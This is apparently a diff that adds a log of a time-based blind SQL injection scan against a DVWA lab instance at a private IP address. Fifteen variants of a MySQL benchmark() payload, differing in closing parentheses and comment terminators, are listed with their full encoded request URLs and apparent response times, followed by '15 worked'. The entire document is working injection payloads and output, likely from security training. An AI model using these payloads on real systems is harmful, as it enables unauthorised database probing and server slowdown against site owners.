@@ -1,0 +1,61 @@
+' and 0=benchmark(3000000,MD5(1))%20/*
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520/%2A&Submit=Submit
+	160
+
+' and 0=benchmark(3000000,MD5(1))%20--
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520--&Submit=Submit
+	158
+
+' and 0=benchmark(3000000,MD5(1))%20%23
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&Submit=Submit
+	158
+
+') and 0=benchmark(3000000,MD5(1))%20/*
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520/%2A&Submit=Submit
+	196
+
+') and 0=benchmark(3000000,MD5(1))%20--
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520--&Submit=Submit
+	196
+
+') and 0=benchmark(3000000,MD5(1))%20%23
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&Submit=Submit
+	197
+
+')) and 0=benchmark(3000000,MD5(1))%20/*
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520/%2A&Submit=Submit
+	197
+
+')) and 0=benchmark(3000000,MD5(1))%20--
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520--&Submit=Submit
+	197
+
+')) and 0=benchmark(3000000,MD5(1))%20%23
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&Submit=Submit
+	198
+
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520/%2A&Submit=Submit
+	198
+
+'))) and 0=benchmark(3000000,MD5(1))%20--
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520--&Submit=Submit
+	198
+
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&Submit=Submit
+	199
+
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520/%2A&Submit=Submit
+	199
+
+')))) and 0=benchmark(3000000,MD5(1))%20--
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520--&Submit=Submit
+	199
+
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&Submit=Submit
+	200
+
+15 worked
